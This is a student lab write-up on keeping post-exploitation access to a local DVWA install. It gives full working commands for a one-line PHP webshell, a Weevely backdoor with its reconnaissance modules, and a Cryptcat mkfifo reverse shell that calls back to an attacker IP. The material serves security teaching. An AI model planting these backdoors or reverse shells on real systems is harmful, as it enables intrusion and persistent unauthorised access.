# Task 2: Maintaining Access  
By: Elisha Sendie
## Disclaimer  
**This project is for educational purposes only. All testing was performed in a
controlled environment or on authorized targets.  

## Introduction  
**Maintaining Access** phase or also known as **persistence** in the target system, involves hacker that installs software or make changes to the target machine in order to access the target over time. Hence, allowing the hacker to stay connected with the target machine which prevent the need to start the process from scratch for the same target (GeeksforGeeks, 2025).    
*Kali Linux* comes with multiple pre-installed hacking tools for all phases of ethical hacking. Under the post-exploitation category there are several hacking tools that are meant for maintaining access. The tools are classified as follows:   
- OS back doors
- Tunnelling and exfiltration
- Web back doors

For this particular task (Maintaining Access), a web back door and tunnelling techniques was explored and configured using three distinct tools.
 
**Objective:** To demonstrate post-exploitation techniques for maintaining access on a compromised target server using three distinct tools.  

**Target Environment:** *Kali Linux* (Attacker) and Vulnerable Target Application (*Damn Vulnerable Web Application, DVWA*)  

**Tools:** *Webshells, Weevely, Cryptcat*

# Target Environment Setup: Installing DVWA  
The *Damn Vulnerable Web Application (DVWA)* is a PHP/MariaDB web application that is vulnerable. It was developed as an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to help both students & teachers to learn about web application security in a controlled class room environment (Wood, 2022).

Such vulnerable web application was used in this task in order to perform the said post-exploitation techniques. *DVWA* was manually installed and configured on the local *Kali Linux* Apache server.

## Step-by-Step Execution  
This section explains the step-by-step execution using Webshell, reproducing the tutorial and explanation provided by Wood (2022) and Swain (2025).  
  
### Step 1: Downloading the Source Code  
![image alt](https://github.com/cybers6064-pair/TMV6064-Cybersecurity-Assignment-1/blob/fe8a7345115b65b0d4d7e6cf8be538af21bf84f0/Task%202%20images/DVWA1.png)    
**Command**: `cd /var/www/html`  
`sudo git clone https://github.com/digininja/DVWA.git`  
**Reason of command:** The `cd` command navigates into the Apache web server's default public directory. The `git clone` command reaches out to GitHub and downloads the entire repository of DVWA's raw PHP source code directly into that folder so the web server can host it.      
### Step 2: Creating Configuration File  
![image alt](https://github.com/cybers6064-pair/TMV6064-Cybersecurity-Assignment-1/blob/3b2021000463436cd644599deb97bce99c07b3ba/Task%202%20images/DVWA2.png)  
**Command:** `sudo cp config/config.inc.php.dist config/config.inc.php`  
**Reason of command:** DVWA does not come with a ready-to-use configuration file to prevent accidental deployment errors (Wood, 2022; Swain, 2025). Alternatively, it provides a template file ending in `.dist` (distribution). The `cp` (copy) command clones this template into an active PHP file that the application will actually read to find its database credentials.  
### Step 3: Starting Database Service    
![image alt](https://github.com/cybers6064-pair/TMV6064-Cybersecurity-Assignment-1/blob/2e9b14c851ac6a20d5ac9d68b9be6f35a0639ef4/Task%202%20images/DVWA6.png)  
**Command:** `sudo service mariadb start`  
**Reason of command:** Before the application can function, the backend database service must be running. This command boots up the MariaDB (MySQL) server so it is ready to accept connections.    
### Step 4: Provisioning the Database & User    
**Command:** `sudo mysql -u root -p`    
**Reason of command:** This logs into the MariaDB command-line monitor as the administrative root user, allows building the backend infrastructure for DVWA.  
**SQL Commands Executed:**  
`create database dvwa;`  
`create user dvwa@127.0.x.x identified by '....';`  
`grant all on dvwa.* to dvwa@127.0.x.x;`  
`flush privileges;`  
The `create database` allocates a dedicated storage space just for this application. The `create user` creates a specific database user with the exact password that matches the `config.inc.php` file from Step 2. Meanwhile, `grant all` gives new user full administrative rights over the dvwa database, explicitly binding it to the `127.0.x.x` local IP to fix socket connection issues. The `flush privileges` forces the database to immediately reload its security tables, locking in our new user permissions.  
### Step 5: Finalizing Setup @ Web Interface
![image alt](https://github.com/cybers6064-pair/TMV6064-Cybersecurity-Assignment-1/blob/472bbb07cf33c0d668826913fa0a67be3d7751d3/Task%202%20images/DVWA7.png)  
**Action:** Navigating to `http://127.0.x.x/DVWA/setup.php` in the web browser and reviewing the Setup Check.  
**Reason for action:** While the MariaDB database was created in the terminal, it is currently empty. The DVWA setup page performs a system check to verify that all necessary backend components (like PHP modules) are running correctly. Once verified, clicking the "Create / Reset Database" button at the bottom of this page triggers the application to automatically build the necessary tables and populate them with default data, completing the installation process.  
### Step 6: Verififcation & Dashboard Access  
![image alt](https://github.com/cybers6064-pair/TMV6064-Cybersecurity-Assignment-1/blob/58279cf79204c7ab360c41218e4da9de3bf6098d/Task%202%20images/DVWA8.png)    
**Action:** Logging into the application with the default credentials (`admin / password`) and accessing the main DVWA Welcome screen.    
**Reason of action:** This confirms the complete and successful installation of the target environment. The Apache web server is properly serving the PHP application, and the platform is successfully communicating with the newly created MariaDB backend. The left-hand navigation menu is now fully populated with the intentionally vulnerable modules, providing the exact sandbox environment needed to begin the post-exploitation and maintaining access phases of the lab.  

# 1. Webshells  
**Webshell** consist of a single-line script that executes system commands through web browser URL parameters. They are written in web programming languages such as *PHP, Java, Perl* and others (Heath, 2023). An attacker can control the script and a *command injection vulnerability* occurs (Heath, 2023).  

## 1.1 Key Features  
The three key features of Webshells are as follows (Gemini, 2026):
### 1.1.1 Simplicity  
Small enough to be hidden inside legitimate website code without drawing attention.
### 1.1.2 Firewall Evasion  
Traffic blends in perfectly with normal HTTP/HTTPS web browsing.
### 1.1.3 Stateless Execution  
Does not hold a constant, open network connection that administrators might detect, and only connects when a command is actively sent.

## 1.2 Step-by-Step Execution  
This section explains the step-by-step execution using Webshell, reproducing the tutorial and explanation generated by Gemini (2026).  

### Step 1: Creating a Backdoor    
![image alt](https://github.com/cybers6064-pair/TMV6064-Cybersecurity-Assignment-1/blob/a92fd1b1887c954cccfc7295d7bb0b6836ed9fcc/Task%202%20images/Webshell1.png)  
**Command:** `echo "<?php system(\$_GET['cmd']); ?>" > simple_shell.php`    
**Reason of command:** This writes a tiny PHP script that takes whatever text is placed in the `cmd` URL parameter and passes it directly to the underlying Linux operating system.  
### Step 2: Uploading & Executing  
(insert ss)  
**Action:** Upload php file in DVWA and accessed via web browser at `.../simple_shell.php?cmd=whoami`  
**Reason of action:** Navigating to this specific URL triggers the Apache web server to run the PHP script, execute the system command (`whoami`), and print the result straight to the webpage.  

# 2. Weevely  
"**Weevely** is a stealth PHP web shell that simulate telnet-like connection. It is an essential tool for web application post exploitation, and can be used as stealth backdoor or as a web shell to manage legit web accounts, even free hosted ones"― *Kali Linux (2025)*  

## 2.1 Key Features  
The three key features of Weevely are as follows (Gemini, 2026):
### 2.1.1 Polymorphic Obfuscation  
Evades basic antivirus and Intrusion Detection Systems (IDS).
### 2.1.2 Encrypted Communications  
Secures the traffic between the attacker and the web server.
### 2.1.3 Built-in Post-Exploitation Modules  
Allows for system enumeration, file management, and lateral movement without uploading additional tools.

## 2.2 Step-by-Step Execution  
This section explains the step-by-step execution using Weevely, reproducing the tutorial and explanation provided by Cloud Learning (2019).  

### Step 1: Generating Payload  
(insert ss)  
**Command:** `weevely generate <password> <filename.php>`  
**Reason of command:** This command crafts the obfuscated PHP backdoor file and locks it with a specific password so only the attacker can access the session.  
### Step 2: Uploading Payload  
(insert ss)  
**Action:** Upload the generated PHP file in the *DVWA* file upload vulnerability.  
**Reason of action:** To physically place the backdoor onto the target server's file system so the web server can execute it.  
### Step 3: Connecting to the Backdoor  
**Command:** `weevely <Target_URL/filename.php> <password>`  
**Reason of command:** This initiates the encrypted connection from the attacker machine to the uploaded script, establishing the remote command-line interface.  
(insert ss)  
**Command:** `system_info`  
**Reason of command:** This command performs automated system reconnaissance. It instantly tells the attacker what operating system is running, the kernel version, and the current user privileges. This is the critical first step in planning a "Privilege Escalation" attack to become the root administrator.  
**Command:** `file_ls`  
**Reason of command:** This command allows the attacker to silently map out the target's file system. Instead of guessing where things are, the attacker uses this to browse the server's folders to locate sensitive information such as database configuration files with hardcoded passwords, without triggering security alarms. 

# 3. Cryptcat  
CryptCat provides a two-way encrypted version of the standard NetCat enhanced program, where it functions as the most basic Unix utility tool, reading and publishing data across network connections (Chandel, 2020). CryptCat encrypts data that users send across a network using either the TCP or UDP protocol, and it acts as a dependable back-end tool that users can easily utilize with scripts (Chandel, 2020).  

## 3.1 Key Features
The three key features of Cryptcat are as follows (Gemini, 2026):
### 3.1.1 Military-Grade Twofish Encryption  
Ensures that packet sniffers (like Wireshark) cannot read the commands or data being transmitted.
### 3.1.2 Protocol/Service Independence  
Bypasses the need for a web server entirely, and works directly over raw TCP ports.
### 3.1.3 Bi-Directional Versatility  
Can act as a listener or a client to create stealthy, point-to-point data connections.

### 3.2 Step-by-Step Execution  
This section explains the step-by-step execution using Cryptcat, reproducing the tutorial and explanation generated by Gemini (2026).  

### Step 1: Setting up the Encrypted Listener (Attacker)  
(insert ss)  
**Command:** `cryptcat -k <Password> -l -v -p 4444`  
**Reason of command:** This opens port 4444 on the attacker's machine and silently waits for the victim machine to call back, ensuring only connections with the correct password are accepted.  
### Step 2: Triggering the Reverse Shell (Victim)  
(insert ss)  
**Command:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | cryptcat 10.x.x.x 4444 -k <Password> > /tmp/f`  
**Reason of command:** Because modern Linux systems disable the easy -e execution flag, this command creates a "Named Pipe" (mkfifo). It loops the input and output of a hidden bash shell directly into the encrypted Cryptcat tunnel pointing back to the attacker's IP.  
### Step 3: Verification  
(insert ss)  
**Action:** Executing commands such as `id` and `ls` on the listener terminal.  
**Reason of action:** To prove that the network tunnel is successfully routing system commands back and forth securely.  

# Comparative Discussion  
Based on our experience using these tools, all of it manage to successfully maintain post-exploitation access. However, they operate at different network layers and serve distinct strategic purposes.  
  
  The simple *Webshell* and *Weevely* both function at the Application Layer as web backdoors, meaning their persistence relies entirely on the target's Apache web server remaining active. Even so, they differ in complexity. The *Webshell* offers extreme stealth through a minimalist, stateless design that blends into normal HTTP traffic, whereas *Weevely* provides a comprehensive, encrypted framework packed with automated enumeration modules.  

  On the other hand, *Cryptcat* operates at the Transport Layer to establish a standalone network tunnel. *Cryptcat* removes the dependency on the web server entirely by using a named pipe to route the shell through Twofish encryption. Consequently, this ensures that if the web application is taken offline or patched by administrators, a secure, independent lifeline to the underlying operating system remains intact.  

# Conclusion
In conclusion, this maintaining access task has managed to demonstrate the critical post-exploitation concept from an offensive persepective. An attacker ensures highly resilient access to a compromised system by developing multiple persistence mechanisms across different network layers, ranging from Application Layer web backdoors like Weevely and a simple PHP shell, to a Transport Layer encrypted tunnel using Cryptcat. This approach guarantees that even if a network administrator discovers and remediates one vulnerability, such as taking the Apache web server offline to neutralize the webshells, the underlying operating system remains fully accessible through an independent, encrypted network connection. Moreover, demonstrating these varied persistence techniques shows why real-world defenders must implement robust, multi-layered security measures to fully secure an environment. 

# References
Chandel, R. (2020, April 2). *Comprehensive guide on CryptCat*. Hacking Articles. https://www.hackingarticles.in/comprehensive-guide-on-cryptcat/  

Cloud Learning (2019, December 10). *Web Hacking for Begginers #19 How to Use Weevely PHP Backdoor* [Video]. Youtube. https://youtu.be/Y1gY5En6MsM?si=bVOiri_LUoSXNeHl  

GeeksforGeeks. (2025, July 23). *Maintaining access tools in Kali Linux*. https://www.geeksforgeeks.org/linux-unix/maintaining-access-tools-in-kali-linux/  

Heath, M. (2023, July 6). *Web Shells: Understanding attacker's tools and techniques*. F5 Labs. https://www.f5.com/labs/articles/web-shells-understanding-attackers-tools-and-techniques  

Kali Linux. (2025, December 9). *Weevely*. https://www.kali.org/tools/weevely/  

Swain, P. (2025, February 21). *Install DVWA in Kali Linux !* [Video]. Youtube. https://youtu.be/FFDdetzSy0s?si=fJ9xwf4UwY00gzFa

Wood, R. (2022, September 16). *Installing DVWA in Kali Linux*. [Video]. Youtube. https://youtu.be/WkyDxNJkgQ4?si=OWxpls95wMxwaTlc





